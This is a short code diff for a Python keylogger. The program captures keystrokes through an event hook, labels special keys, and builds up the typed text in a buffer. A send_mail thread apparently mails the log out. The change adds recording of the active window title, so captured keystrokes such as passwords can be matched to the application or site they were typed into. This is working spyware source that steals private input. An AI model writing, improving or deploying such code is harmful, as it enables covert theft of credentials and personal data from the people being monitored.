@@ -65,7 +65,8 @@ def send_mail():
 
 
 def pushing(event):
-    global data
+    global data, lastWindow
+    window = event.WindowName
     keys = {
             13: ' [ENTER] ',
             8: ' [BACKSPACE] ',
@@ -87,7 +88,12 @@ def pushing(event):
             91: ' [SUPER] '
             }
     keyboardKeyName = keys.get(event.Ascii, chr(event.Ascii))
-    data += keyboardKeyName
+    if window != lastWindow:
+        lastWindow = window
+        data += ' { ' + lastWindow + ' } '
+        data += keyboardKeyName 
+    else:
+        data += keyboardKeyName
 
 if __name__ == '__main__':
     triggerThread = Thread(target=send_mail)
